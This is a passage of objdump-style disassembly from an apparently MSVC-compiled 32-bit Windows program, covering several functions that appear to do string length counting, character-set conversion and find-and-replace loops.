  40314c:	75 f9                	jne    0x403147
  40314e:	2b c2                	sub    %edx,%eax
  403150:	8b f8                	mov    %eax,%edi
  403152:	8b c3                	mov    %ebx,%eax
  403154:	8d b5 cc fe ff ff    	lea    -0x134(%ebp),%esi
  40315a:	e8 21 3f 00 00       	call   0x407080
  40315f:	8b d6                	mov    %esi,%edx
  403161:	52                   	push   %edx
  403162:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  403166:	e8 65 04 00 00       	call   0x4035d0
  40316b:	8b 85 cc fe ff ff    	mov    -0x134(%ebp),%eax
  403171:	bf 10 00 00 00       	mov    $0x10,%edi
  403176:	83 c4 04             	add    $0x4,%esp
  403179:	39 bd e0 fe ff ff    	cmp    %edi,-0x120(%ebp)
  40317f:	73 02                	jae    0x403183
  403181:	8b c6                	mov    %esi,%eax
  403183:	50                   	push   %eax
  403184:	68 2c a6 40 00       	push   $0x40a62c
  403189:	68 00 04 00 00       	push   $0x400
  40318e:	53                   	push   %ebx
  40318f:	ff 15 30 a2 40 00    	call   *0x40a230
  403195:	8b c3                	mov    %ebx,%eax
  403197:	83 c4 10             	add    $0x10,%esp
  40319a:	8d 50 01             	lea    0x1(%eax),%edx
  40319d:	8d 49 00             	lea    0x0(%ecx),%ecx
  4031a0:	8a 08                	mov    (%eax),%cl
  4031a2:	40                   	inc    %eax
  4031a3:	84 c9                	test   %cl,%cl
  4031a5:	75 f9                	jne    0x4031a0
  4031a7:	2b c2                	sub    %edx,%eax
  4031a9:	8b f0                	mov    %eax,%esi
  4031ab:	39 bd e0 fe ff ff    	cmp    %edi,-0x120(%ebp)
  4031b1:	72 10                	jb     0x4031c3
  4031b3:	8b 85 cc fe ff ff    	mov    -0x134(%ebp),%eax
  4031b9:	50                   	push   %eax
  4031ba:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4031c0:	83 c4 04             	add    $0x4,%esp
  4031c3:	c7 85 e0 fe ff ff 0f 	movl   $0xf,-0x120(%ebp)
  4031ca:	00 00 00 
  4031cd:	c7 85 dc fe ff ff 00 	movl   $0x0,-0x124(%ebp)
  4031d4:	00 00 00 
  4031d7:	c6 85 cc fe ff ff 00 	movb   $0x0,-0x134(%ebp)
  4031de:	39 bd a8 fe ff ff    	cmp    %edi,-0x158(%ebp)
  4031e4:	72 10                	jb     0x4031f6
  4031e6:	8b 8d 94 fe ff ff    	mov    -0x16c(%ebp),%ecx
  4031ec:	51                   	push   %ecx
  4031ed:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4031f3:	83 c4 04             	add    $0x4,%esp
  4031f6:	8b c6                	mov    %esi,%eax
  4031f8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4031fb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403202:	59                   	pop    %ecx
  403203:	5f                   	pop    %edi
  403204:	5e                   	pop    %esi
  403205:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403208:	33 cd                	xor    %ebp,%ecx
  40320a:	e8 71 4f 00 00       	call   0x408180
  40320f:	8b e5                	mov    %ebp,%esp
  403211:	5d                   	pop    %ebp
  403212:	c3                   	ret
  403213:	cc                   	int3
  403214:	cc                   	int3
  403215:	cc                   	int3
  403216:	cc                   	int3
  403217:	cc                   	int3
  403218:	cc                   	int3
  403219:	cc                   	int3
  40321a:	cc                   	int3
  40321b:	cc                   	int3
  40321c:	cc                   	int3
  40321d:	cc                   	int3
  40321e:	cc                   	int3
  40321f:	cc                   	int3
  403220:	55                   	push   %ebp
  403221:	8b ec                	mov    %esp,%ebp
  403223:	6a ff                	push   $0xffffffff
  403225:	68 90 92 40 00       	push   $0x409290
  40322a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403230:	50                   	push   %eax
  403231:	83 ec 3c             	sub    $0x3c,%esp
  403234:	a1 18 e0 40 00       	mov    0x40e018,%eax
  403239:	33 c5                	xor    %ebp,%eax
  40323b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40323e:	53                   	push   %ebx
  40323f:	56                   	push   %esi
  403240:	50                   	push   %eax
  403241:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403244:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40324a:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40324d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403254:	32 db                	xor    %bl,%bl
  403256:	e8 15 f2 ff ff       	call   0x402470
  40325b:	50                   	push   %eax
  40325c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40325f:	50                   	push   %eax
  403260:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  403264:	e8 97 00 00 00       	call   0x403300
  403269:	8b 35 e8 a1 40 00    	mov    0x40a1e8,%esi
  40326f:	83 c4 08             	add    $0x8,%esp
  403272:	83 7d cc 08          	cmpl   $0x8,-0x34(%ebp)
  403276:	72 09                	jb     0x403281
  403278:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  40327b:	51                   	push   %ecx
  40327c:	ff d6                	call   *%esi
  40327e:	83 c4 04             	add    $0x4,%esp
  403281:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  403285:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403288:	73 03                	jae    0x40328d
  40328a:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40328d:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403290:	52                   	push   %edx
  403291:	50                   	push   %eax
  403292:	8d 45 08             	lea    0x8(%ebp),%eax
  403295:	50                   	push   %eax
  403296:	33 c0                	xor    %eax,%eax
  403298:	e8 33 33 00 00       	call   0x4065d0
  40329d:	83 f8 ff             	cmp    $0xffffffff,%eax
  4032a0:	74 02                	je     0x4032a4
  4032a2:	b3 01                	mov    $0x1,%bl
  4032a4:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  4032a8:	72 09                	jb     0x4032b3
  4032aa:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4032ad:	51                   	push   %ecx
  4032ae:	ff d6                	call   *%esi
  4032b0:	83 c4 04             	add    $0x4,%esp
  4032b3:	83 7d 1c 10          	cmpl   $0x10,0x1c(%ebp)
  4032b7:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  4032be:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  4032c5:	c6 45 d4 00          	movb   $0x0,-0x2c(%ebp)
  4032c9:	72 09                	jb     0x4032d4
  4032cb:	8b 55 08             	mov    0x8(%ebp),%edx
  4032ce:	52                   	push   %edx
  4032cf:	ff d6                	call   *%esi
  4032d1:	83 c4 04             	add    $0x4,%esp
  4032d4:	8a c3                	mov    %bl,%al
  4032d6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4032d9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4032e0:	59                   	pop    %ecx
  4032e1:	5e                   	pop    %esi
  4032e2:	5b                   	pop    %ebx
  4032e3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4032e6:	33 cd                	xor    %ebp,%ecx
  4032e8:	e8 93 4e 00 00       	call   0x408180
  4032ed:	8b e5                	mov    %ebp,%esp
  4032ef:	5d                   	pop    %ebp
  4032f0:	c3                   	ret
  4032f1:	cc                   	int3
  4032f2:	cc                   	int3
  4032f3:	cc                   	int3
  4032f4:	cc                   	int3
  4032f5:	cc                   	int3
  4032f6:	cc                   	int3
  4032f7:	cc                   	int3
  4032f8:	cc                   	int3
  4032f9:	cc                   	int3
  4032fa:	cc                   	int3
  4032fb:	cc                   	int3
  4032fc:	cc                   	int3
  4032fd:	cc                   	int3
  4032fe:	cc                   	int3
  4032ff:	cc                   	int3
  403300:	55                   	push   %ebp
  403301:	8b ec                	mov    %esp,%ebp
  403303:	6a ff                	push   $0xffffffff
  403305:	68 68 8e 40 00       	push   $0x408e68
  40330a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403310:	50                   	push   %eax
  403311:	83 ec 14             	sub    $0x14,%esp
  403314:	53                   	push   %ebx
  403315:	56                   	push   %esi
  403316:	57                   	push   %edi
  403317:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40331c:	33 c5                	xor    %ebp,%eax
  40331e:	50                   	push   %eax
  40331f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403322:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403328:	8b 75 0c             	mov    0xc(%ebp),%esi
  40332b:	33 db                	xor    %ebx,%ebx
  40332d:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  403331:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  403334:	72 04                	jb     0x40333a
  403336:	8b 06                	mov    (%esi),%eax
  403338:	eb 02                	jmp    0x40333c
  40333a:	8b c6                	mov    %esi,%eax
  40333c:	53                   	push   %ebx
  40333d:	53                   	push   %ebx
  40333e:	53                   	push   %ebx
  40333f:	53                   	push   %ebx
  403340:	6a ff                	push   $0xffffffff
  403342:	50                   	push   %eax
  403343:	53                   	push   %ebx
  403344:	53                   	push   %ebx
  403345:	ff 15 40 a0 40 00    	call   *0x40a040
  40334b:	8b f8                	mov    %eax,%edi
  40334d:	3b fb                	cmp    %ebx,%edi
  40334f:	0f 8e af 00 00 00    	jle    0x403404
  403355:	33 c9                	xor    %ecx,%ecx
  403357:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  40335a:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40335d:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  403360:	3b f9                	cmp    %ecx,%edi
  403362:	76 2e                	jbe    0x403392
  403364:	57                   	push   %edi
  403365:	8d 75 e0             	lea    -0x20(%ebp),%esi
  403368:	e8 23 47 00 00       	call   0x407a90
  40336d:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  403370:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403373:	8b c3                	mov    %ebx,%eax
  403375:	2b c1                	sub    %ecx,%eax
  403377:	03 c7                	add    %edi,%eax
  403379:	74 0c                	je     0x403387
  40337b:	50                   	push   %eax
  40337c:	6a 00                	push   $0x0
  40337e:	51                   	push   %ecx
  40337f:	e8 b4 57 00 00       	call   0x408b38
  403384:	83 c4 0c             	add    $0xc,%esp
  403387:	8b 75 0c             	mov    0xc(%ebp),%esi
  40338a:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  40338d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403390:	33 c9                	xor    %ecx,%ecx
  403392:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403395:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  403399:	72 04                	jb     0x40339f
  40339b:	8b 06                	mov    (%esi),%eax
  40339d:	eb 02                	jmp    0x4033a1
  40339f:	8b c6                	mov    %esi,%eax
  4033a1:	51                   	push   %ecx
  4033a2:	51                   	push   %ecx
  4033a3:	57                   	push   %edi
  4033a4:	53                   	push   %ebx
  4033a5:	6a ff                	push   $0xffffffff
  4033a7:	50                   	push   %eax
  4033a8:	51                   	push   %ecx
  4033a9:	51                   	push   %ecx
  4033aa:	ff 15 40 a0 40 00    	call   *0x40a040
  4033b0:	8b 75 08             	mov    0x8(%ebp),%esi
  4033b3:	8b c3                	mov    %ebx,%eax
  4033b5:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4033bc:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4033c3:	c6 06 00             	movb   $0x0,(%esi)
  4033c6:	8d 50 01             	lea    0x1(%eax),%edx
  4033c9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4033d0:	8a 08                	mov    (%eax),%cl
  4033d2:	40                   	inc    %eax
  4033d3:	84 c9                	test   %cl,%cl
  4033d5:	75 f9                	jne    0x4033d0
  4033d7:	2b c2                	sub    %edx,%eax
  4033d9:	8b f8                	mov    %eax,%edi
  4033db:	8b c3                	mov    %ebx,%eax
  4033dd:	e8 9e 3c 00 00       	call   0x407080
  4033e2:	85 db                	test   %ebx,%ebx
  4033e4:	74 0a                	je     0x4033f0
  4033e6:	53                   	push   %ebx
  4033e7:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4033ed:	83 c4 04             	add    $0x4,%esp
  4033f0:	8b c6                	mov    %esi,%eax
  4033f2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4033f5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4033fc:	59                   	pop    %ecx
  4033fd:	5f                   	pop    %edi
  4033fe:	5e                   	pop    %esi
  4033ff:	5b                   	pop    %ebx
  403400:	8b e5                	mov    %ebp,%esp
  403402:	5d                   	pop    %ebp
  403403:	c3                   	ret
  403404:	8b 45 08             	mov    0x8(%ebp),%eax
  403407:	c7 40 14 0f 00 00 00 	movl   $0xf,0x14(%eax)
  40340e:	89 58 10             	mov    %ebx,0x10(%eax)
  403411:	88 18                	mov    %bl,(%eax)
  403413:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403416:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40341d:	59                   	pop    %ecx
  40341e:	5f                   	pop    %edi
  40341f:	5e                   	pop    %esi
  403420:	5b                   	pop    %ebx
  403421:	8b e5                	mov    %ebp,%esp
  403423:	5d                   	pop    %ebp
  403424:	c3                   	ret
  403425:	cc                   	int3
  403426:	cc                   	int3
  403427:	cc                   	int3
  403428:	cc                   	int3
  403429:	cc                   	int3
  40342a:	cc                   	int3
  40342b:	cc                   	int3
  40342c:	cc                   	int3
  40342d:	cc                   	int3
  40342e:	cc                   	int3
  40342f:	cc                   	int3
  403430:	55                   	push   %ebp
  403431:	8b ec                	mov    %esp,%ebp
  403433:	6a ff                	push   $0xffffffff
  403435:	68 38 8e 40 00       	push   $0x408e38
  40343a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403440:	50                   	push   %eax
  403441:	83 ec 1c             	sub    $0x1c,%esp
  403444:	53                   	push   %ebx
  403445:	56                   	push   %esi
  403446:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40344b:	33 c5                	xor    %ebp,%eax
  40344d:	50                   	push   %eax
  40344e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403451:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  403457:	8b 45 08             	mov    0x8(%ebp),%eax
  40345a:	33 f6                	xor    %esi,%esi
  40345c:	83 78 14 10          	cmpl   $0x10,0x14(%eax)
  403460:	89 75 ec             	mov    %esi,-0x14(%ebp)
  403463:	72 02                	jb     0x403467
  403465:	8b 00                	mov    (%eax),%eax
  403467:	56                   	push   %esi
  403468:	56                   	push   %esi
  403469:	6a ff                	push   $0xffffffff
  40346b:	50                   	push   %eax
  40346c:	56                   	push   %esi
  40346d:	56                   	push   %esi
  40346e:	ff 15 80 a0 40 00    	call   *0x40a080
  403474:	8b d8                	mov    %eax,%ebx
  403476:	3b de                	cmp    %esi,%ebx
  403478:	0f 8e 8c 00 00 00    	jle    0x40350a
  40347e:	89 75 dc             	mov    %esi,-0x24(%ebp)
  403481:	89 75 e0             	mov    %esi,-0x20(%ebp)
  403484:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  403487:	8d 75 dc             	lea    -0x24(%ebp),%esi
  40348a:	e8 91 38 00 00       	call   0x406d20
  40348f:	8b 45 08             	mov    0x8(%ebp),%eax
  403492:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403499:	83 78 14 10          	cmpl   $0x10,0x14(%eax)
  40349d:	72 02                	jb     0x4034a1
  40349f:	8b 00                	mov    (%eax),%eax
  4034a1:	8b 75 dc             	mov    -0x24(%ebp),%esi
  4034a4:	53                   	push   %ebx
  4034a5:	56                   	push   %esi
  4034a6:	6a ff                	push   $0xffffffff
  4034a8:	50                   	push   %eax
  4034a9:	6a 00                	push   $0x0
  4034ab:	6a 00                	push   $0x0
  4034ad:	ff 15 80 a0 40 00    	call   *0x40a080
  4034b3:	33 c0                	xor    %eax,%eax
  4034b5:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  4034bc:	c7 47 10 00 00 00 00 	movl   $0x0,0x10(%edi)
  4034c3:	66 89 07             	mov    %ax,(%edi)
  4034c6:	8b c6                	mov    %esi,%eax
  4034c8:	8d 50 02             	lea    0x2(%eax),%edx
  4034cb:	eb 03                	jmp    0x4034d0
  4034cd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4034d0:	66 8b 08             	mov    (%eax),%cx
  4034d3:	83 c0 02             	add    $0x2,%eax
  4034d6:	66 85 c9             	test   %cx,%cx
  4034d9:	75 f5                	jne    0x4034d0
  4034db:	2b c2                	sub    %edx,%eax
  4034dd:	d1 f8                	sar    $1,%eax
  4034df:	50                   	push   %eax
  4034e0:	8b c6                	mov    %esi,%eax
  4034e2:	8b cf                	mov    %edi,%ecx
  4034e4:	e8 27 3e 00 00       	call   0x407310
  4034e9:	85 f6                	test   %esi,%esi
  4034eb:	74 2c                	je     0x403519
  4034ed:	56                   	push   %esi
  4034ee:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4034f4:	83 c4 04             	add    $0x4,%esp
  4034f7:	8b c7                	mov    %edi,%eax
  4034f9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4034fc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403503:	59                   	pop    %ecx
  403504:	5e                   	pop    %esi
  403505:	5b                   	pop    %ebx
  403506:	8b e5                	mov    %ebp,%esp
  403508:	5d                   	pop    %ebp
  403509:	c3                   	ret
  40350a:	33 c9                	xor    %ecx,%ecx
  40350c:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  403513:	89 77 10             	mov    %esi,0x10(%edi)
  403516:	66 89 0f             	mov    %cx,(%edi)
  403519:	8b c7                	mov    %edi,%eax
  40351b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40351e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403525:	59                   	pop    %ecx
  403526:	5e                   	pop    %esi
  403527:	5b                   	pop    %ebx
  403528:	8b e5                	mov    %ebp,%esp
  40352a:	5d                   	pop    %ebp
  40352b:	c3                   	ret
  40352c:	cc                   	int3
  40352d:	cc                   	int3
  40352e:	cc                   	int3
  40352f:	cc                   	int3
  403530:	55                   	push   %ebp
  403531:	8b ec                	mov    %esp,%ebp
  403533:	53                   	push   %ebx
  403534:	57                   	push   %edi
  403535:	8b f8                	mov    %eax,%edi
  403537:	33 db                	xor    %ebx,%ebx
  403539:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403540:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403544:	8b 4e 10             	mov    0x10(%esi),%ecx
  403547:	72 04                	jb     0x40354d
  403549:	8b 06                	mov    (%esi),%eax
  40354b:	eb 02                	jmp    0x40354f
  40354d:	8b c6                	mov    %esi,%eax
  40354f:	51                   	push   %ecx
  403550:	50                   	push   %eax
  403551:	57                   	push   %edi
  403552:	8b c3                	mov    %ebx,%eax
  403554:	e8 77 30 00 00       	call   0x4065d0
  403559:	8b d8                	mov    %eax,%ebx
  40355b:	83 fb ff             	cmp    $0xffffffff,%ebx
  40355e:	74 15                	je     0x403575
  403560:	8b 45 08             	mov    0x8(%ebp),%eax
  403563:	8b 4e 10             	mov    0x10(%esi),%ecx
  403566:	50                   	push   %eax
  403567:	51                   	push   %ecx
  403568:	e8 83 2e 00 00       	call   0x4063f0
  40356d:	8b 55 08             	mov    0x8(%ebp),%edx
  403570:	03 5a 10             	add    0x10(%edx),%ebx
  403573:	eb cb                	jmp    0x403540
  403575:	5f                   	pop    %edi
  403576:	5b                   	pop    %ebx
  403577:	5d                   	pop    %ebp
  403578:	c3                   	ret
  403579:	cc                   	int3
  40357a:	cc                   	int3
  40357b:	cc                   	int3
  40357c:	cc                   	int3
  40357d:	cc                   	int3
  40357e:	cc                   	int3
  40357f:	cc                   	int3
  403580:	55                   	push   %ebp
  403581:	8b ec                	mov    %esp,%ebp
  403583:	56                   	push   %esi
  403584:	57                   	push   %edi
  403585:	33 f6                	xor    %esi,%esi
  403587:	83 7b 14 08          	cmpl   $0x8,0x14(%ebx)
  40358b:	8b 7b 10             	mov    0x10(%ebx),%edi
  40358e:	72 04                	jb     0x403594
  403590:	8b 03                	mov    (%ebx),%eax
  403592:	eb 02                	jmp    0x403596
  403594:	8b c3                	mov    %ebx,%eax
  403596:	57                   	push   %edi
  403597:	50                   	push   %eax
  403598:	8b 45 08             	mov    0x8(%ebp),%eax
  40359b:	50                   	push   %eax
  40359c:	8b c6                	mov    %esi,%eax
  40359e:	e8 4d 34 00 00       	call   0x4069f0
  4035a3:	8b f0                	mov    %eax,%esi
  4035a5:	83 fe ff             	cmp    $0xffffffff,%esi
  4035a8:	74 15                	je     0x4035bf
  4035aa:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4035ad:	51                   	push   %ecx
  4035ae:	57                   	push   %edi
  4035af:	8b 7d 08             	mov    0x8(%ebp),%edi
  4035b2:	e8 39 32 00 00       	call   0x4067f0
  4035b7:	8b 55 0c             	mov    0xc(%ebp),%edx
  4035ba:	03 72 10             	add    0x10(%edx),%esi
  4035bd:	eb c8                	jmp    0x403587
  4035bf:	5f                   	pop    %edi
  4035c0:	5e                   	pop    %esi
  4035c1:	5d                   	pop    %ebp
  4035c2:	c3                   	ret
  4035c3:	cc                   	int3
  4035c4:	cc                   	int3
  4035c5:	cc                   	int3
  4035c6:	cc                   	int3
  4035c7:	cc                   	int3
  4035c8:	cc                   	int3
  4035c9:	cc                   	int3
  4035ca:	cc                   	int3
  4035cb:	cc                   	int3
  4035cc:	cc                   	int3
  4035cd:	cc                   	int3
  4035ce:	cc                   	int3
  4035cf:	cc                   	int3
  4035d0:	55                   	push   %ebp
  4035d1:	8b ec                	mov    %esp,%ebp
  4035d3:	6a ff                	push   $0xffffffff
  4035d5:	68 00 8e 40 00       	push   $0x408e00
  4035da:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4035e0:	50                   	push   %eax
  4035e1:	83 ec 78             	sub    $0x78,%esp
  4035e4:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4035e9:	33 c5                	xor    %ebp,%eax
  4035eb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4035ee:	53                   	push   %ebx
  4035ef:	56                   	push   %esi
  4035f0:	57                   	push   %edi
  4035f1:	50                   	push   %eax
  4035f2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4035f5:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4035fb:	8b 45 08             	mov    0x8(%ebp),%eax
  4035fe:	33 db                	xor    %ebx,%ebx
  403600:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  403606:	8d 7b 01             	lea    0x1(%ebx),%edi
  403609:	b8 20 a6 40 00       	mov    $0x40a620,%eax
  40360e:	8d 75 80             	lea    -0x80(%ebp),%esi
  403611:	c7 45 94 0f 00 00 00 	movl   $0xf,-0x6c(%ebp)
  403618:	89 5d 90             	mov    %ebx,-0x70(%ebp)
  40361b:	88 5d 80             	mov    %bl,-0x80(%ebp)
  40361e:	e8 5d 3a 00 00       	call   0x407080
  403623:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403626:	b8 24 a6 40 00       	mov    $0x40a624,%eax
  40362b:	8d 75 b8             	lea    -0x48(%ebp),%esi
  40362e:	c7 45 cc 0f 00 00 00 	movl   $0xf,-0x34(%ebp)
  403635:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  403638:	88 5d b8             	mov    %bl,-0x48(%ebp)
  40363b:	e8 40 3a 00 00       	call   0x407080
  403640:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  403646:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  403649:	51                   	push   %ecx
  40364a:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  40364e:	e8 dd fe ff ff       	call   0x403530
  403653:	be 10 00 00 00       	mov    $0x10,%esi
  403658:	83 c4 04             	add    $0x4,%esp
  40365b:	39 75 cc             	cmp    %esi,-0x34(%ebp)
  40365e:	72 0d                	jb     0x40366d
  403660:	8b 55 b8             	mov    -0x48(%ebp),%edx
  403663:	52                   	push   %edx
  403664:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40366a:	83 c4 04             	add    $0x4,%esp
  40366d:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403674:	c7 45 cc 0f 00 00 00 	movl   $0xf,-0x34(%ebp)
  40367b:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  40367e:	88 5d b8             	mov    %bl,-0x48(%ebp)
  403681:	39 75 94             	cmp    %esi,-0x6c(%ebp)
  403684:	72 0d                	jb     0x403693
  403686:	8b 45 80             	mov    -0x80(%ebp),%eax
  403689:	50                   	push   %eax
  40368a:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403690:	83 c4 04             	add    $0x4,%esp
  403693:	bf 01 00 00 00       	mov    $0x1,%edi
  403698:	b8 20 a6 40 00       	mov    $0x40a620,%eax
  40369d:	8d 75 9c             	lea    -0x64(%ebp),%esi
  4036a0:	c7 45 b0 0f 00 00 00 	movl   $0xf,-0x50(%ebp)
  4036a7:	89 5d ac             	mov    %ebx,-0x54(%ebp)
  4036aa:	88 5d 9c             	mov    %bl,-0x64(%ebp)
  4036ad:	e8 ce 39 00 00       	call   0x407080
  4036b2:	bf 02 00 00 00       	mov    $0x2,%edi
  4036b7:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4036ba:	b8 28 a6 40 00       	mov    $0x40a628,%eax
  4036bf:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4036c2:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  4036c9:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4036cc:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  4036cf:	e8 ac 39 00 00       	call   0x407080
  4036d4:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  4036d8:	33 f6                	xor    %esi,%esi
  4036da:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4036e0:	83 7d e8 10          	cmpl   $0x10,-0x18(%ebp)
  4036e4:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4036e7:	73 03                	jae    0x4036ec
  4036e9:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4036ec:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4036ef:	8b bd 7c ff ff ff    	mov    -0x84(%ebp),%edi
  4036f5:	51                   	push   %ecx
  4036f6:	50                   	push   %eax
  4036f7:	57                   	push   %edi
  4036f8:	8b c6                	mov    %esi,%eax
  4036fa:	e8 d1 2e 00 00       	call   0x4065d0
  4036ff:	8b f0                	mov    %eax,%esi
  403701:	83 fe ff             	cmp    $0xffffffff,%esi
  403704:	74 16                	je     0x40371c
  403706:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403709:	8d 55 9c             	lea    -0x64(%ebp),%edx
  40370c:	52                   	push   %edx
  40370d:	50                   	push   %eax
  40370e:	8b de                	mov    %esi,%ebx
  403710:	e8 db 2c 00 00       	call   0x4063f0
  403715:	03 75 ac             	add    -0x54(%ebp),%esi
  403718:	33 db                	xor    %ebx,%ebx
  40371a:	eb c4                	jmp    0x4036e0
  40371c:	be 10 00 00 00       	mov    $0x10,%esi
  403721:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  403724:	72 0d                	jb     0x403733
  403726:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  403729:	51                   	push   %ecx
  40372a:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403730:	83 c4 04             	add    $0x4,%esp
  403733:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40373a:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  403741:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  403744:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  403747:	39 75 b0             	cmp    %esi,-0x50(%ebp)
  40374a:	72 0d                	jb     0x403759
  40374c:	8b 55 9c             	mov    -0x64(%ebp),%edx
  40374f:	52                   	push   %edx
  403750:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403756:	83 c4 04             	add    $0x4,%esp
  403759:	6a 02                	push   $0x2
  40375b:	68 28 a6 40 00       	push   $0x40a628
  403760:	57                   	push   %edi
  403761:	33 c0                	xor    %eax,%eax
  403763:	e8 68 2e 00 00       	call   0x4065d0
  403768:	83 f8 ff             	cmp    $0xffffffff,%eax
  40376b:	0f 85 22 ff ff ff    	jne    0x403693
  403771:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403774:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40377b:	59                   	pop    %ecx
  40377c:	5f                   	pop    %edi
  40377d:	5e                   	pop    %esi
  40377e:	5b                   	pop    %ebx
  40377f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403782:	33 cd                	xor    %ebp,%ecx
  403784:	e8 f7 49 00 00       	call   0x408180
  403789:	8b e5                	mov    %ebp,%esp
  40378b:	5d                   	pop    %ebp
  40378c:	c3                   	ret
  40378d:	cc                   	int3
  40378e:	cc                   	int3
  40378f:	cc                   	int3
  403790:	55                   	push   %ebp
  403791:	8b ec                	mov    %esp,%ebp
  403793:	51                   	push   %ecx
  403794:	56                   	push   %esi
  403795:	57                   	push   %edi
  403796:	8b f9                	mov    %ecx,%edi
  403798:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
  40379c:	8b f2                	mov    %edx,%esi
  40379e:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4037a5:	72 04                	jb     0x4037ab
